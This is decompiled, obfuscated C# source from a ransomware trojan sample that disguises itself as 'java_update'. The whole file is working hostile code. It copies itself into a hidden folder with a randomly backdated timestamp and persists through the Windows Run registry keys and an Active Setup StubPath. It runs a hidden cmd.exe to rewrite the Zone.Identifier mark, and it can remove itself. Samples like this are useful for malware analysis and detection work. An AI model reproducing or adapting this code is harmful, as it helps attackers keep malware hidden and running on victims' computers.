// Decompiled with JetBrains decompiler
// Type: ᏬĴவߙւ̞ᙘ.ဦپ᥎૭ᢜ߂Ḵ৘᝘իހᗗጄ࿨ऐḽ
// Assembly: java_update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 557F7238-B13A-4798-94BE-2CA1CC027032
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-501fe6aaa92a5c9bad3bf6a1cdf6d5d77d5236bad8aca53c2ce66f490a365092.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace ᏬĴவߙւ̞ᙘ
{
  internal class ဦپ᥎૭ᢜ߂Ḵ\u09D8\u1758իހᗗጄ\u0FE8ऐḽ
  {
    public static void ᱭ\u0EE5ᛵἸᑶઆǧ\u0AFC()
    {
      ဦپ᥎૭ᢜ߂Ḵ\u09D8\u1758իހᗗጄ\u0FE8ऐḽ.ೠࠒᚎẳіᮉښѳᎱᮣ᳣();
      ဦپ᥎૭ᢜ߂Ḵ\u09D8\u1758իހᗗጄ\u0FE8ऐḽ.ď\u0DFB\u001EדᩗᚁФŽྰၲ();
      ဦپ᥎૭ᢜ߂Ḵ\u09D8\u1758իހᗗጄ\u0FE8ऐḽ.\u0F10ቼ᱔ᯎ\u1B68\u00A7ᵰᶰᕈᔦ\u0FFD᪻ȑḟΒ();
    }

    private static void ೠࠒᚎẳіᮉښѳᎱᮣ᳣()
    {
      try
      {
        if (!Directory.Exists(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ))
          Directory.CreateDirectory(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ);
      }
      catch
      {
      }
      try
      {
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ, ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0FE5Ĝȃᖪༀಠ༷ϣ, true)), true);
      }
      catch
      {
      }
      try
      {
        if (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ቋᇄ\u005D᪗\u1C8D\u0AFEṶ\u00B0ਘ\u187E\u1C3B)
        {
          Random random = new Random();
          int day = random.Next(1, 28);
          int month = random.Next(1, 12);
          int year = random.Next(2000, DateTime.Now.Year);
          Directory.SetCreationTime(Path.Combine(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ, ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0FE5Ĝȃᖪༀಠ༷ϣ, true)), new DateTime(year, month, day));
        }
      }
      catch
      {
      }
      if (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.Ꮖቿߚ\u0082ἶፙيܓ\u1C83Αᶕ\u007Eྼ)
      {
        try
        {
          File.SetAttributes(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
        }
        catch
        {
        }
      }
      if (!ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ᶤ\u0EE3ďЈןẦڼ᪈ᖃרោᗥ\u0898ቚ\u0AFAࣻ)
        return;
      try
      {
        File.SetAttributes(Path.Combine(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ, ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1B36મኰ\u175B\u0FE6ჿهᎲն७\u0CE4ሪק(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0FE5Ĝȃᖪༀಠ༷ϣ, true)), FileAttributes.Hidden | FileAttributes.NotContentIndexed);
      }
      catch
      {
      }
    }

    public static void \u0F10ቼ᱔ᯎ\u1B68\u00A7ᵰᶰᕈᔦ\u0FFD᪻ȑḟΒ()
    {
      try
      {
        if (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ᨉᯊᕮṣᖁܔ\u0024ၧ\u192Fອ\u0005җϔіƫᇎ᳸ߘྫ)
          Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0F92ಘṔЍ᯳İVͭᢄͯረᇚŗᒜ, true), (object) (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ + "\\" + ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0FE5Ĝȃᖪༀಠ༷ϣ, true)));
      }
      catch
      {
      }
      try
      {
        if (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ڜᢣ֡ਿᒙ\u1C95\u0D5Aᣵᜃኋᚆ\u02FBἼᮕፓᭋᙀ)
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0F92ಘṔЍ᯳İVͭᢄͯረᇚŗᒜ, true), (object) (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ + "\\" + ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0FE5Ĝȃᖪༀಠ༷ϣ, true)));
      }
      catch
      {
      }
      try
      {
        if (!ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.İೡỨᴻ᱓໑\u0FE6ẕ)
          return;
        RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.த\u05FFᆚ\u0FE9Ꮀᄸ, true));
        subKey.SetValue("StubPath", (object) (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ + "\\" + ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0FE5Ĝȃᖪༀಠ༷ϣ, true)));
        subKey.SetValue("IsInstalled", (object) 1, RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    private static void ď\u0DFB\u001EדᩗᚁФŽྰၲ()
    {
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          FileName = "cmd.exe",
          UseShellExecute = false,
          RedirectStandardInput = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        StreamWriter standardInput = process.StandardInput;
        standardInput.WriteLine("cd " + ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u031A᪴ဗ᷁ៜ\u0D04ᎆᗿ\u087Bᓙ);
        standardInput.WriteLine("echo [zoneTransfer]ZoneID = 2 > " + ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0FE5Ĝȃᖪༀಠ༷ϣ, true) + ":ZONE.identifier");
        standardInput.Close();
        process.Kill();
      }
      catch
      {
      }
    }

    public static void ޥ২\u09A9ࡀ݉ᘁ͟ྋ\u00AD᧖ᎂaᩩᩈᖱႈᝣ()
    {
      try
      {
        Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0F92ಘṔЍ᯳İVͭᢄͯረᇚŗᒜ, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u1927ୂޒġᬈឋᷳᚁግྭषỂ, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.DeleteSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A84ሇᇍӏ\u0863ᑴ\u1CF7ҳḟچޑ݊ᆼᑹༀܼᠠጸᙹ(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.த\u05FFᆚ\u0FE9Ꮀᄸ, true));
      }
      catch
      {
      }
      try
      {
        switch (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0ADAΚᘔᇼྣமनඟњལရ\u1809ज़\u0FF9᪑ᛕ)
        {
          case RegistryHive.CurrentUser:
            Registry.CurrentUser.DeleteSubKey(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u19EAጂ\u0EF5༠ɀಌǒ\u0B96ᐅੰkၘឪ๒ᓾ\u0E8Eᡏ);
            break;
          case RegistryHive.LocalMachine:
            Registry.LocalMachine.DeleteSubKey(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u19EAጂ\u0EF5༠ɀಌǒ\u0B96ᐅੰkၘឪ๒ᓾ\u0E8Eᡏ);
            break;
        }
      }
      catch
      {
      }
      ဦپ᥎૭ᢜ߂Ḵ\u09D8\u1758իހᗗጄ\u0FE8ऐḽ.\u035FжᏰҩᵮၮ\u0CD8ᬤᥴᣮഓĝᑥᴫך();
    }

    public static void \u035FжᏰҩᵮၮ\u0CD8ᬤᥴᣮഓĝᑥᴫך()
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        File.Move(Process.GetCurrentProcess().MainModule.FileName, tempFileName);
        ᓡ\u058Bᗞ\u0001֥ᏻᆬĕᄲᮐ\u008Dᔁ\u1BFC\u12B7.ᮅᤌṧ\u1B61\u139Aᏼಐസߨᷲᨲ\u00B8ᝪௌᩭԛᗚẀ(tempFileName, (string) null, ᓡ\u058Bᗞ\u0001֥ᏻᆬĕᄲᮐ\u008Dᔁ\u1BFC\u12B7.ጪᶶ͊\u0E5Eᨘ\u17EEᡋ.\u1C3Eೄ\u02C4ᘃᄙݙᧈ౭ᒪ\u0DD7᪘\u1801Ἑᚘ\u0E7F);
      }
      catch (Exception ex)
      {
      }
    }

    public enum \u0946ᆻ\u0ACEᦏᮁᤎஒ\u0EF2\u0D56ȹЦ
    {
      \u16FD\u0CFFᬟƁᴈ\u0984ᙷཋறᖿᰚՂΰ,
      \u1368ᛗ\u1C85ీ၇ߖᅀǻ၃\u0867ᙏᝳᨨঐ៣ӽᚓᬵ,
      ᩊЦ\u0C75ᴏ\u0B91͔ૡڳᗏ\u02D5,
    }
  }
}
